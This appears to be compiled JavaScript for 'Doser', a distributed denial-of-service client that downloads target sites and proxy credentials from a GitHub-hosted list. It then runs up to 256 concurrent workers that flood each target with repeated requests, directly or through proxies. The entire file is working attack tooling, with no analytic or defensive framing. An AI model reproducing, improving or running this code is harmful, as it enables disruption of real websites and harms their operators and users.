"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
exports.__esModule = true;
exports.Doser = void 0;
var axios_https_proxy_fix_1 = require("axios-https-proxy-fix");
var events_1 = require("events");
var Doser = /** @class */ (function () {
    function Doser(onlyProxy, workers) {
        this.hosts = [];
        this.onlyProxy = onlyProxy;
        this.working = false;
        this.workers = workers;
        this.eventSource = new events_1.EventEmitter();
        this.workerActive = new Array(256);
        this.workerActive.fill(false);
    }
    Doser.prototype.forceProxy = function (newVal) {
        this.onlyProxy = newVal;
    };
    Doser.prototype.loadHostsFile = function () {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/];
            });
        });
    };
    Doser.prototype.getSitesAndProxyes = function () {
        return __awaiter(this, void 0, void 0, function () {
            var sitesResponse, proxyResponse, sites, proxyes, e_1;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (!this.working) return [3 /*break*/, 6];
                        _a.label = 1;
                    case 1:
                        _a.trys.push([1, 4, , 5]);
                        return [4 /*yield*/, axios_https_proxy_fix_1["default"].get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })];
                    case 2:
                        sitesResponse = _a.sent();
                        return [4 /*yield*/, axios_https_proxy_fix_1["default"].get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })];
                    case 3:
                        proxyResponse = _a.sent();
                        if (sitesResponse.status !== 200)
                            return [3 /*break*/, 0];
                        if (proxyResponse.status !== 200)
                            return [3 /*break*/, 0];
                        sites = sitesResponse.data;
                        proxyes = proxyResponse.data;
                        return [2 /*return*/, {
                                sites: sites,
                                proxyes: proxyes
                            }];
                    case 4:
                        e_1 = _a.sent();
                        console.log('Error while loading hosts');
                        console.log(e_1);
                        return [3 /*break*/, 5];
                    case 5: return [3 /*break*/, 0];
                    case 6: return [2 /*return*/, null];
                }
            });
        });
    };
    Doser.prototype.getRandomTarget = function () {
        return __awaiter(this, void 0, void 0, function () {
            var sitesResponse, proxyResponse, sites, proxyes, e_2;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (!this.working) return [3 /*break*/, 6];
                        _a.label = 1;
                    case 1:
                        _a.trys.push([1, 4, , 5]);
                        return [4 /*yield*/, axios_https_proxy_fix_1["default"].get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })];
                    case 2:
                        sitesResponse = _a.sent();
                        return [4 /*yield*/, axios_https_proxy_fix_1["default"].get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })];
                    case 3:
                        proxyResponse = _a.sent();
                        if (sitesResponse.status !== 200)
                            return [3 /*break*/, 0];
                        if (proxyResponse.status !== 200)
                            return [3 /*break*/, 0];
                        sites = sitesResponse.data;
                        proxyes = proxyResponse.data;
                        return [2 /*return*/, {
                                site: sites[Math.floor(Math.random() * sites.length)],
                                proxy: proxyes
                            }];
                    case 4:
                        e_2 = _a.sent();
                        console.log('Error while loading hosts');
                        console.log(e_2);
                        return [3 /*break*/, 5];
                    case 5: return [3 /*break*/, 0];
                    case 6: return [2 /*return*/, null];
                }
            });
        });
    };
    Doser.prototype.start = function () {
        var _this = this;
        this.working = true;
        this.setWorkersCount(this.workers);
        var _loop_1 = function (i) {
            var setI = i;
            setImmediate(function () { return void _this.worker.bind(_this)(setI); });
        };
        for (var i = 0; i < 256; i++) {
            _loop_1(i);
        }
    };
    Doser.prototype.setWorkersCount = function (newCount) {
        this.workers = newCount;
        for (var wIndex = 0; wIndex < 256; wIndex++) {
            this.workerActive[wIndex] = (wIndex < newCount);
        }
    };
    Doser.prototype.stop = function () {
        this.working = false;
    };
    Doser.prototype.listen = function (event, callback) {
        this.eventSource.addListener(event, callback);
    };
    Doser.prototype.worker = function (workerIndex) {
        return __awaiter(this, void 0, void 0, function () {
            var config, configTimestamp, target, directRequest, response, e_3, ATACKS_PER_TARGET, proxy, atackIndex, r, proxyAddressSplit, proxyIP, proxyPort, proxyAuthSplit, proxyUsername, proxyPassword, r, e_4, code;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0: return [4 /*yield*/, this.getSitesAndProxyes()];
                    case 1:
                        config = _a.sent();
                        configTimestamp = new Date();
                        _a.label = 2;
                    case 2:
                        if (!this.working) return [3 /*break*/, 20];
                        if (!!this.workerActive[workerIndex]) return [3 /*break*/, 4];
                        return [4 /*yield*/, new Promise(function (resolve) { return setTimeout(resolve, 10000); })];
                    case 3:
                        _a.sent();
                        return [3 /*break*/, 2];
                    case 4:
                        if (!((new Date()).getTime() - configTimestamp.getTime() > 300000)) return [3 /*break*/, 6];
                        return [4 /*yield*/, this.getSitesAndProxyes()];
                    case 5:
                        config = _a.sent();
                        configTimestamp = new Date();
                        _a.label = 6;
                    case 6:
                        if (config == null) {
                            return [3 /*break*/, 20];
                        }
                        target = {
                            site: config.sites[Math.floor(Math.random() * config.sites.length)],
                            proxy: config.proxyes
                        };
                        directRequest = false;
                        if (!!this.onlyProxy) return [3 /*break*/, 10];
                        _a.label = 7;
                    case 7:
                        _a.trys.push([7, 9, , 10]);
                        return [4 /*yield*/, axios_https_proxy_fix_1["default"].get(target.site.page, { timeout: 10000 })];
                    case 8:
                        response = _a.sent();
                        directRequest = response.status === 200;
                        return [3 /*break*/, 10];
                    case 9:
                        e_3 = _a.sent();
                        this.eventSource.emit('error', { type: 'error', error: e_3 });
                        directRequest = false;
                        return [3 /*break*/, 10];
                    case 10:
                        ATACKS_PER_TARGET = 64;
                        proxy = null;
                        atackIndex = 0;
                        _a.label = 11;
                    case 11:
                        if (!((atackIndex < ATACKS_PER_TARGET) && this.working)) return [3 /*break*/, 19];
                        _a.label = 12;
                    case 12:
                        _a.trys.push([12, 17, , 18]);
                        if (!directRequest) return [3 /*break*/, 14];
                        return [4 /*yield*/, axios_https_proxy_fix_1["default"].get(target.site.page, { timeout: 5000, validateStatus: function () { return true; } })];
                    case 13:
                        r = _a.sent();
                        this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: target.site.page + " | DIRECT | " + r.status });
                        return [3 /*break*/, 16];
                    case 14:
                        if (proxy === null) {
                            proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)];
                        }
                        proxyAddressSplit = proxy.ip.split(':');
                        proxyIP = proxyAddressSplit[0];
                        proxyPort = parseInt(proxyAddressSplit[1]);
                        proxyAuthSplit = proxy.auth.split(':');
                        proxyUsername = proxyAuthSplit[0];
                        proxyPassword = proxyAuthSplit[1];
                        return [4 /*yield*/, axios_https_proxy_fix_1["default"].get(target.site.page, {
                                timeout: 10000,
                                validateStatus: function () { return true; },
                                proxy: {
                                    host: proxyIP,
                                    port: proxyPort,
                                    auth: {
                                        username: proxyUsername,
                                        password: proxyPassword
                                    }
                                }
                            })];
                    case 15:
                        r = _a.sent();
                        this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: target.site.page + " | PROXY | " + r.status });
                        if (r.status === 407) {
                            console.log(proxy);
                            proxy = null;
                        }
                        _a.label = 16;
                    case 16: return [3 /*break*/, 18];
                    case 17:
                        e_4 = _a.sent();
                        console.log(e_4);
                        proxy = null;
                        code = e_4.code;
                        if (code === undefined) {
                            console.log(e_4);
                            code = 'UNKNOWN';
                        }
                        this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: target.site.page + " | " + code });
                        if (code === 'ECONNABORTED') {
                            return [3 /*break*/, 19];
                        }
                        return [3 /*break*/, 18];
                    case 18:
                        atackIndex++;
                        return [3 /*break*/, 11];
                    case 19: return [3 /*break*/, 2];
                    case 20: return [2 /*return*/];
                }
            });
        });
    };
    return Doser;
}());
exports.Doser = Doser;
